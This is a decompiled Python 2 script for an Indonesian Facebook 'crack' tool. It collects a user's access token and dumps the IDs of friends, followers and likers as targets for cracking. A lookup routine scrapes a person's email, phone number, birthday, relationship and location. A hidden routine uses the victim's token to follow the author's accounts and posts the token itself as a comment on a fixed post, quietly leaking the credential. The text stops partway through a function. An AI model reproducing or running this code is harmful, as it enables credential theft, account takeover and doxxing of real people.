# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar  1 2022, 15:44:46) 
# [GCC Android (7714059, based on r416183c1) Clang 12.0.8 (https://android.google
# Embedded file name: <Ahmad_Riswanto>
import os
try:
    import requests
except ImportError:
    print '\n [\xc3\x97] Modul requests belum terinstall!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [\xc3\x97] Modul Futures belum terinstall!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [\xc3\x97] Modul Bs4 belum terinstall!...\n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
koh = '100000834003593'
xi_jimpinx = '4257706904267068'
ok, cp, id, loop = ([], [], [], 0)
hoetank = random.choice(['Yang Posting Orang Nya Ganteng:)', 'Script Nya Mantap Bang:v', 'Never Giv Up:v'])
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] Menghapus Token %s' % (N, M, N, x),
        sys.stdout.flush()
        time.sleep(1)


logo = ' \x1b[0;96m\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x94\x8f\xe2\x94\x93\xc2\xae \n \x1b[0;96m\xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x83\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x94\x8f\xe2\x94\x9b\xe2\x94\x97\xe2\x94\x93  \x1b[0m|| \x1b[0;96mCreated By Angga\n \x1b[0;96m\xe2\x94\x83\xe2\x94\x97\xe2\x94\x9b\xe2\x94\x97\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x9b  \x1b[0m|| \x1b[0;96mGithub.com/Bajingan-Z\n \x1b[0;96m\xe2\x94\x83\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x93\xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\xab\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x83\xe2\x94\x81\xe2\x94\x81\xe2\x94\xab\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x83\xe2\x94\x83   \x1b[0m|| \x1b[0;96mFb.me/PEMUDA.KALEUM\n \x1b[0;96m\xe2\x94\x83\xe2\x94\x97\xe2\x94\x81\xe2\x94\x9b\xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x94\x97\xe2\x94\x9b\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x83\xe2\x94\x97\xe2\x94\x93  \x1b[0m|| \x1b[0;96mYoutube Angga-Z\n \x1b[0;96m\xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x9b\xe2\x94\x97\xe2\x94\xbb\xe2\x94\x9b\xe2\x94\x97\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x93\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x9b\xe2\x94\x97\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x9b  \x1b[0m|| \x1b[0;91mv2.1.1 \n \x1b[0;96m\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x9b\xe2\x94\x83\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b     \n \x1b[0;96m\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\xe2\x95\x8b\x1b[0m'
lo_ngentod = '800676813861801'

def hasil(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] Crack Selesai...' % (N, K, N)
        print '\n\n [%s+%s] Total OK : %s%s%s' % (O, N, H, str(len(ok)), N)
        print ' [%s+%s] Total CP : %s%s%s' % (O, N, K, str(len(cp)), N)
        exit()
    else:
        print '\n\n [%s!%s] Opshh Kamu Tidak Mendapatkan Hasil :(' % (M, N)
        exit()


def yayanxd():
    os.system('clear')
    print ' %s\xe2\x97\x8d\xe2\x9e\xa4%s This Tool Uses Facebook Token Login.\n %s\xe2\x97\x8d\xe2\x9e\xa4%s Do You Already Know How To Get Facebook Token?\n %s\xe2\x97\x8d\xe2\x9e\xa4%s Type %sOpen%s To Get Facebook Token.' % (O, N, O, N, O, N, H, N)
    kontol = raw_input('\n %s[%s?%s] \xe2\x98\x86TOKEN\xe2\x98\x86\xe2\x84\xa2\xef\xb8\xbb\xc2\xae\xe2\x95\xa4\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x90\xe2\x97\x8d\xe2\x9e\xa4 :%s ' % (N, M, N, H))
    if kontol in ('open', 'Open', 'OPEN'):
        print '\n%s *%s Usahakan Akun Tumbal Login Di Kiwi Browser Terlebih Dahulu' % (B, N)
        time.sleep(2)
        print '%s *%s Jangan Lupa! Url Ubah Ke %shttps://m.facebook.com' % (B, N, H)
        time.sleep(2)
        print '%s *%s Setelah Di Alihkan Ke Kiwi Browser. Klik %sTitik Tiga' % (B, N, H)
        time.sleep(2)
        print '%s *%s Lalu Klik %sCari di Halaman%s Tinggal ketik %sEAAG%s Lalu salin.' % (B, N, H, N, H, N)
        time.sleep(2)
        raw_input(' %s\xe2\x97\x8d\xe2\x9e\xa4%s Tekan Enter ' % (O, N))
        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
        yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol).json()['name']
        print '\n\n %s<>%s WELCOME %s%s%s' % (O, N, K, nama, N)
        time.sleep(2)
        print ' %s<>%s Please Use This Sc Properly, We Are Not Responsible If This Sc Is Misused...' % (O, N)
        time.sleep(2)
        open('.memek.txt', 'w').write(kontol)
        raw_input(' %s\xe2\x97\x8d\xe2\x9e\xa4%s Tekan Enter ' % (O, N))
        wuhan(kontol)
        os.system('xdg-open https://youtu.be/bszAm4C5ovE')
        moch_yayan()
    except KeyError:
        print '\n\n %s[%s!%s] Token Invalid' % (N, M, N)
        time.sleep(2)
        yayanxd()


def moch_yayan():
    os.system('clear')
    try:
        kontol = open('.memek.txt', 'r').read()
    except IOError:
        print '\n %s[%s\xc3\x97%s] Token Invalid' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .memek.txt')
        yayanxd()

    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol).json()['name']
    except KeyError:
        print '\n %s[%s\xc3\x97%s] Token Invalid' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .memek.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] Tidak Ada Koneksi\n' % (N, M, N))

    os.system('clear')
    print logo
    IP = requests.get('https://www.yayanxd.my.id/server/ip/').text
    print '___________________________________________________________\n'
    time.sleep(0.03)
    print ' [\x1b[0;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[0m] NAMA : %s' % nama
    time.sleep(0.03)
    print ' [\x1b[0;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[0m] IP   : %s' % IP
    print '___________________________________________________________\n'
    time.sleep(0.03)
    print ' [%s1%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Dump Id Dari Teman' % (O, N)
    time.sleep(0.03)
    print ' [%s2%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Dump Id Dari Teman Publik' % (O, N)
    time.sleep(0.03)
    print ' [%s3%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Dump Id Dari Total Followers' % (O, N)
    time.sleep(0.03)
    print ' [%s4%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Dump Id Dari Like Postingan' % (O, N)
    time.sleep(0.03)
    print ' [%s5%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m \x1b[1;92mMulai Crack\x1b[1;97m' % (O, N)
    time.sleep(0.03)
    print ' [%s6%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Check Informasi Akun Fb' % (O, N)
    time.sleep(0.03)
    print ' [%s7%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Lihat Hasil Crack' % (O, N)
    time.sleep(0.03)
    print ' [%s8%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Settings User Agent' % (O, N)
    time.sleep(0.03)
    print ' [%s9%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Info %sScript%s' % (O, N, O, N)
    time.sleep(0.03)
    print ' [%s0%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Logout (%sHapus Token%s)' % (M, N, M, N)
    time.sleep(0.03)
    pepek = raw_input('\n [\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m] Menu : ')
    if pepek == '':
        print '\n %s[%s\xc3\x97%s] jangan kosong kentod!' % (N, M, N)
        time.sleep(2)
        moch_yayan()
    elif pepek in ('1', '01'):
        teman(kontol)
    elif pepek in ('2', '02'):
        publik(kontol)
    elif pepek in ('3', '03'):
        followers(kontol)
    elif pepek in ('4', '04'):
        postingan(kontol)
    elif pepek in ('5', '05'):
        __crack__().plerr()
    elif pepek in ('6', '06'):
        cek_ingfo(kontol)
    elif pepek in ('7', '07'):
        try:
            dirs = os.listdir('results')
            print '\n [ Hasil Crack Yang Tersimpan Di File Anda ]\n'
            for file in dirs:
                print ' [%s+%s] %s' % (O, N, file)

            file = raw_input('\n [%s?%s] Masukan Nama File :%s ' % (M, N, H))
            if file == '':
                file = raw_input('\n %s[%s?%s] Masukan Nama File :%s %s' % (N, M, N, H, N))
            total = open('results/%s' % file).read().splitlines()
            print ' %s[%s#%s] --------------------------------------------' % (N, O, N)
            time.sleep(2)
            nm_file = ('%s' % file).replace('-', ' ')
            hps_nm = nm_file.replace('.txt', '').replace('OK', '').replace('CP', '')
            jalan(' [%s*%s] Hasil %sCrack%s Pada Tanggal %s:%s%s%s total %s: %s%s%s' % (M, N, O, N, M, O, hps_nm, N, M, O, len(total), O))
            print ' %s[%s#%s] --------------------------------------------' % (N, O, N)
            time.sleep(2)
            for memek in total:
                kontol = memek.replace('\n', '')
                titid = kontol.replace(' [\xe2\x9c\x93] ', ' \x1b[0m[\x1b[1;92m\xe2\x9c\x93\x1b[0m]\x1b[1;92m ').replace(' [\xc3\x97] ', ' \x1b[0m[\x1b[1;93m\xc3\x97\x1b[0m]\x1b[1;93m ')
                print '%s%s' % (titid, N)
                time.sleep(0.03)

            print ' %s[%s#%s] --------------------------------------------' % (N, O, N)
            raw_input('\n  [ %sKEMBALI%s ] ' % (O, N))
            moch_yayan()
        except IOError:
            print '\n %s[%s\xc3\x97%s] Opshh Kamu Tidak Mendapatkan Hasil :(' % (N, M, N)
            raw_input('\n  [ %sKEMBALI%s ] ' % (O, N))
            moch_yayan()

    elif pepek in ('8', '08'):
        seting_yntkts()
    elif pepek in ('9', '09'):
        info_tools()
    elif pepek in ('0', '00'):
        print '\n'
        tod()
        time.sleep(1)
        os.system('rm -rf .memek.txt')
        jalan('\n %s[%s\xe2\x9c\x93%s]%s Berhasil Menghapus Token' % (N, H, N, H))
        exit()
    else:
        print '\n %s[%s\xc3\x97%s] Menu [%s%s%s] Tidak Ada, Cek Menu Nya Bro!' % (N, M, N, M, pepek, N)
        time.sleep(2)
        moch_yayan()


def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s' % (koh, kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (lo_ngentod, kentod, kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (xi_jimpinx, hoetank, kentod))
    except:
        pass


def teman(kontol):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        mmk = raw_input('\n %s[%s?%s] Nama File  : ' % (N, O, N))
        asw = raw_input(' %s[%s?%s] Limit Id   : ' % (N, O, N))
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        xxx = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s' % (asw, kontol)).json()['data']:
            id.append(a['name'] + '<=>' + a['id'])
            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)

        xxx.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] Berhasil Dump Id Dari Teman' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s] Salin Output File \xf0\x9f\x91\x89\xf0\x9f\x92\xa6 ( %s%s%s )' % (O, N, M, cin, N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal Dump Id, Kemungkinan Id Tidaklah Publik.\n' % (N, M, N))
        raw_input(' [ %sKEMBALI%s ] ' % (O, N))
        moch_yayan()


def publik(kontol):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        csy = raw_input('\n %s[%s?%s] Id Publik  : ' % (N, O, N))
        ahh = raw_input(' %s[%s?%s] Nama File  : ' % (N, O, N))
        ihh = raw_input(' %s[%s?%s] Limit Id   : ' % (N, O, N))
        knt = ('dump/' + ahh + '.json').replace(' ', '_')
        xxx = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy, ihh, kontol)).json()['data']:
            id.append(a['name'] + '<=>' + a['id'])
            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)

        xxx.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] Berhasil Dump Id Dari Teman Publik' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s] Salin Output File \xf0\x9f\x91\x89\xf0\x9f\x92\xa6 ( %s%s%s )' % (O, N, M, knt, N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] Gagal Dump Id, Kemungkinan Id Tidaklah Publik.\n' % (N, M, N))
        raw_input(' [ %sKEMBALI%s ] ' % (O, N))
        moch_yayan()


def followers(kontol):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        csy = raw_input('\n %s[%s?%s] Id Follow  : ' % (N, O, N))
        mmk = raw_input(' %s[%s?%s] Nama File  : ' % (N, O, N))
        asw = raw_input(' %s[%s?%s] Limit Id   : ' % (N, O, N))
        ah = ('dump/' + mmk + '.json').replace(' ', '_')
        xxx = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (csy, asw, kontol)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            xxx.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)

        xxx.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] Berhasil Dump Id Dari Total Followers' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s] Salin Output File \xf0\x9f\x91\x89\xf0\x9f\x92\xa6 ( %s%s%s )' % (O, N, M, ah, N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(ah)
        jalan('\n %s[%s!%s] Gagal Dump Id, Kemungkinan Id Tidaklah Publik.\n' % (N, M, N))
        raw_input(' [ %sKEMBALI%s ] ' % (O, N))
        moch_yayan()


def postingan(kontol):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        csy = raw_input('\n %s[%s?%s] Id Posting : ' % (N, O, N))
        ppk = raw_input(' %s[%s?%s] Nama File  : ' % (N, O, N))
        asw = raw_input(' %s[%s?%s] Limit Id   : ' % (N, O, N))
        ahh = ('dump/' + ppk + '.json').replace(' ', '_')
        xxx = open(ahh, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s' % (csy, asw, kontol)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            xxx.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)

        xxx.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] Berhasil Dump Id Dari Like Postingan' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s] Salin Output File \xf0\x9f\x91\x89\xf0\x9f\x92\xa6 ( %s%s%s )' % (O, N, M, ahh, N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(ahh)
        jalan('\n %s[%s!%s] Gagal Dump Id, Kemungkinan Id Tidaklah Publik.\n' % (N, M, N))
        raw_input(' [ %sKEMBALI%s ] ' % (O, N))
        moch_yayan()


def cek_ingfo(kontol):
    try:
        user = raw_input('\n [%s+%s] Masukan Id Atau Username : ' % (O, N))
        if user == '':
            print '\n [%s!%s] Jangan Kosong Bos' % (M, N)
            cek_ingfo(kontol)
        url = 'https://lookup-id.com/'
        if 'facebook' in user:
            payload = {'fburl': user, 'check': 'Lookup'}
        else:
            payload = {'fburl': 'https://free.facebook.com/' + user, 'check': 'Lookup'}
        halaman = requests.post(url, data=payload).text.encode('utf-8')
        sop_ = BeautifulSoup(halaman, 'html.parser')
        email_ = sop_.find('span', id='code')
        idt = email_.text
        if user == 'me':
            idt = 'me'
        x = requests.get('https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s' % (idt, kontol)).json()
        nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s' % (M, N)

    print '\n  * Ingformasi Akun Facebook *'
    time.sleep(0.03)
    print '\n [*] Nama Lengkap : %s' % nmaa
    time.sleep(0.03)
    try:
        ndpn = x['first_name']
    except (KeyError, IOError):
        ndpn = '%s-%s' % (M, N)

    print ' [*] Nama Depan   : %s' % ndpn
    time.sleep(0.03)
    try:
        nmbl = x['last_name']
    except (KeyError, IOError):
        nmbl = '%s-%s' % (M, N)

    print ' [*] Nama Belakang: %s' % nmbl
    time.sleep(0.03)
    try:
        hwhs = x['username']
    except (KeyError, IOError):
        hwhs = '%s-%s' % (M, N)

    print ' [*] Username Fb  : %s' % hwhs
    time.sleep(0.03)
    try:
        asu = x['id']
    except (KeyError, IOError):
        asu = '%s-%s' % (M, N)

    print ' [*] id facebook  : %s' % asu
    time.sleep(0.03)
    print '\n  * data-data akun facebook *\n'
    time.sleep(0.03)
    try:
        emai = x['email']
    except (KeyError, IOError):
        emai = '%s-%s' % (M, N)

    print ' [*] gmail facebook : %s' % emai
    time.sleep(0.03)
    try:
        nmrr = x['mobile_phone']
    except (KeyError, IOError):
        nmrr = '%s-%s' % (M, N)

    print ' [*] nomor telepon  : %s' % nmrr
    time.sleep(0.03)
    try:
        ttll = x['birthday']
        month, day, year = ttll.split('/')
        month = bulan_ttl[month]
    except (KeyError, IOError):
        month = '%s-%s' % (M, N)
        day = '%s-%s' % (M, N)
        year = '%s-%s' % (M, N)

    print ' [*] tanggal lahir  : %s %s %s ' % (day, month, year)
    time.sleep(0.03)
    try:
        jenis = x['gender'].replace('female', 'Perempuan').replace('male', 'Laki-laki')
    except (KeyError, IOError):
        jenis = ''

    print ' [*] jenis kelamin  : %s ' % jenis
    try:
        r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s' % (idt, kontol))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    except:
        pass

    print ' [*] Jumlah Teman  : %s' % str(len(id))
    time.sleep(0.03)
    try:
        r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s' % (idt, kontol))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
        pengikut = '%s-%s' % (M, N)

    print ' [*] total followers: %s' % pengikut
    time.sleep(0.03)
    try:
        lins = x['link']
    except (KeyError, IOError):
        lins = '%s-%s' % (M, N)

    print ' [*] link facebook  : %s' % lins
    time.sleep(0.03)
    try:
        stas = x['relationship_status']
    except (KeyError, IOError):
        stas = '%s-%s' % (M, N)

    try:
        dgn = 'dengan %s' % x['significant_other']['name']
    except (KeyError, IOError):
        dgn = '%s-%s' % (M, N)
    except:
        pass

    print ' [*] status hubungan: %s %s' % (stas, dgn)
    time.sleep(0.03)
    try:
        bioo = x['about']
    except (KeyError, IOError):
        bioo = '%s-%s' % (M, N)
    except:
        pass

    print ' [*] tentang status : %s' % bioo
    time.sleep(0.03)
    try:
        dari = x['hometown']['name']
    except (KeyError, IOError):
        dari = '%s-%s' % (M, N)
    except:
        pass

    print ' [*] kota asal      : %s' % dari
    time.sleep(0.03)
    try:
        tigl = x['location']['name']
    except (KeyError, IOError):
        tigl = '%s-%s' % (M, N)
    except:
        pass

    print ' [*] tinggal di     : %s' % tigl
    time.sleep(0.03)
    try:
        tzim = x['timezone']
    except (KeyError, IOError):
        tzim = '%s-%s' % (M, N)
    except:
        pass

    print ' [*] zona waktu     : %s' % tzim
    time.sleep(0.03)
    try:
        jam = x['updated_time'][11:19]
        uptd = x['updated_time'][:10]
        year, month, day = uptd.split('-')
        month = bulan_ttl[month]
    except (KeyError, IOError):
        year = '%s-%s' % (M, N)
        month = '%s-%s' % (M, N)
        day = '%s-%s' % (M, N)
    except:
        pass

    print ' [*] Terakhir Di Updated Pada Tanggal %s Bulan %s Tahun %s Jam %s' % (day, month, year, jam)
    time.sleep(0.03)
    print ' %s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    jalan('\n [%s\xe2\x9c\x93%s] Berhasil Mengecek Data\xc2\xb2 Akun Facebook\n\n' % (O, N))
    exit()


def info_tools():
    os.system('clear')
    print ' %s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.07)
    print '\n %s[%s>%s]\xe2\x97\x8d\xe2\x9e\xa4 Yt       : Angga-Z.' % (N, H, N)
    time.sleep(0.07)
    print '\n %s[%s>%s]\xe2\x97\x8d\xe2\x9e\xa4 Author   : Bangsat Militan\xe2\x98\x86.' % (N, H, N)
    time.sleep(0.07)
    print '\n %s[%s>%s]\xe2\x97\x8d\xe2\x9e\xa4 Github   : https://github.com/Bajingan-Z-XD' % (N, H, N)
    time.sleep(0.07)
    print '\n %s[%s>%s]\xe2\x97\x8d\xe2\x9e\xa4 Facebook : https://www.facebook.com/PEMUDA.KALEM' % (N, H, N)
    time.sleep(0.07)
    print '\n %s[%s>%s]\xe2\x97\x8d\xe2\x9e\xa4 Instagram: https://www.instagram.com/bangsat_xd' % (N, H, N)
    time.sleep(0.07)
    print '\n %s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.07)
    raw_input('\n  [ %sKEMBALI%s ] ' % (O, N))
    moch_yayan()


def seting_yntkts():
    print '\n (%s1%s) ganti user agent' % (O, N)
    print ' (%s2%s) check user agent' % (O, N)
    ytbjts = raw_input('\n %s[%s?%s] choose : ' % (N, O, N))
    if ytbjts == '':
        print '\n %s[%s\xc3\x97%s] Gak Boleh Kosong Kentod' % (N, M, N)
        time.sleep(2)
        seting_yntkts()
    elif ytbjts in ('1', '01'):
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in ('2', '02'):
        try:
            user_agent = open('YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-' % M

        print '\n %s[%s+%s] User Agent anda : %s%s' % (N, O, N, H, user_agent)
        raw_input('\n  %s[ %skembali%s ]' % (N, O, N))
        moch_yayan()
    else:
        print '\n %s[%s\xc3\x97%s] Input Yang Bener' % (N, M, N)
        time.sleep(2)
        seting_yntkts()


def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    _asu_ = raw_input('\n [%s?%s] Ingin Menggunakan User Agent Hp Anda [Y/t]: ' % (O, N))
    if _asu_ == '':
        print '\n %s[%s\xc3\x97%s] Gak boleh kosong Kentod' % (N, M, N)
        yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in ('Y', 'y'):
        jalan('\n %s *%s Anda Akan Di Arakan Ke Situs Web Setelah Diarahkan Ke Situs Web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...' % (O, N, O, N, H, N))
        time.sleep(2)
        os.system('xdg-open https://www.yayanxd.my.id/server')
